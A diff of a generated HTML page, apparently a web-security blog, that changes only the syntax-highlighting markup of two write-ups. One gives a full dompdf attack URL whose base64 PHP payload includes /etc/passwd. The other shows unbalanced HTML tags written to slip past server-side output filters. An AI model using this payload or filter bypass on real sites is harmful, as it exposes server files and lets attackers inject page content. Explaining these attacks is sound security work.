+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;data:image/jpeg;base64,HERE_SOME_BASE64_ENCODED_BINARY_THINGS&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Using &lt;strong&gt;data&lt;/strong&gt; to embed images in the PDF is a nice hack, if you have never seen a
@@ -1393,7 +2308,7 @@ mime type &lt;code&gt;application/x-httpd-php&lt;/code&gt; (you could also try X
 
 &lt;p&gt;And the final attack is:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;/dompdf/dompdf.php?base_path=&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;options[Attachment]=0&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;input_file=data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmluY2x1ZGUgKCcvZXRjL3Bhc3N3ZCcpOw0KZWNobyAiYnllIjsNCj8%2B&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://&lt;span class=&quot;nt&quot;&gt;&amp;lt;target&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;path&amp;gt;&lt;/span&gt;/dompdf/dompdf.php?base_path=&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;options[Attachment]=0&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;input_file=data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmluY2x1ZGUgKCcvZXRjL3Bhc3N3ZCcpOw0KZWNobyAiYnllIjsNCj8%2B&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;If default settings for &lt;code&gt;DOMPDF_ENABLE_PHP&lt;/code&gt; and &lt;code&gt;DOMPDF_ENABLE_REMOTE&lt;/code&gt; are
@@ -1490,52 +2405,52 @@ page clearly forgot to close some tags.&lt;/p&gt;
 &lt;p&gt;So this:&lt;/p&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Is automatically rewritten with closing &lt;code&gt;&amp;lt;/LI&amp;gt;&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;LI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;LI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LI&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LI&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;But let&#39;s look at something nastier, we have an opening &lt;code&gt;&amp;lt;DIV&amp;gt;&lt;/code&gt; inside the &lt;code&gt;&amp;lt;LI&amp;gt;&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo
-          &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
              test
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The browser will add the closing DIV:&lt;/p&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo
-          &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
             test
-          &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;DIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML --&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/DIV&amp;gt;&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML --&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Chances are that a &lt;strong&gt;server side output filter&lt;/strong&gt;, filtering HTML contributions
@@ -1545,14 +2460,14 @@ tags&lt;/strong&gt; you can detect that a closing tag is missing.&lt;/p&gt;
 &lt;p&gt;So our bad contributor will instead write this:&lt;/p&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- initial --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;third&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;test&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end third --&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end second --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;third&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end third --&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end second --&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And &lt;strong&gt;if you count&lt;/strong&gt; the number of closing and opening tags, or if you try to
@@ -1562,19 +2477,19 @@ good.&lt;/p&gt;
 &lt;p&gt;And now the browser result:&lt;/p&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- rendered --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo
-           &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;third&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;test
-            &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;DIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML - end third--&amp;gt;&lt;/span&gt;
-           &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;DIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML - end second --&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end third? no, end foo --&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end second? no end foo&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end foo&amp;#39;s parent&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;foo
